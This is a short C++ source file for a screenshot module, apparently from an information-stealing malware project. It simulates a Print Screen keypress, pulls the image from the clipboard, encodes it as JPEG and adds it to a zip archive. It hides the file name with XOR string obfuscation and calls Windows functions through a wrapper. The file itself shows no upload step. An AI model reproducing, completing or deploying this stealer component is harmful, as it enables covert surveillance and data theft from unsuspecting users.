#include "screenshot.h"

#include "../../winapi/winapi.h"

#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/zip_handle/zip_handle.h"

#include <atlimage.h>
#include <vector>

screenshot g_screenshot;

void screenshot::run()
{
	//setting to the screen shot
	g_winapi.keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	g_winapi.keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

	//handler of the bitmap that save the screen shot
	HBITMAP bitmap;

	// Delay in 1 second
	g_winapi.Sleeping(1000);

	//take the screen shot
	g_winapi.OpenClipboard(0);

	//save the screen shot in the bitmap handler
	bitmap = (HBITMAP)g_winapi.GetClipboardData(CF_BITMAP);

	//relese the screen shot
	g_winapi.CloseClipboard();

	std::vector<unsigned char> buf;

	IStream* stream = 0;
	HRESULT hr = g_winapi.CreateStreamOnHGlobal(0, 1, &stream);
	CImage image;
	ULARGE_INTEGER liSize;

	// screenshot to jpg and save to stream
	image.Attach(bitmap);
	image.Save(stream, Gdiplus::ImageFormatJPEG);

	IStream_Size(stream, &liSize);

	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[0], len);
	stream->Release();

	std::string buffer(buf.begin(), buf.end());
	g_zip.write_zip(std::string(XOR_STRING("Screenshot.jpg")), buffer);
}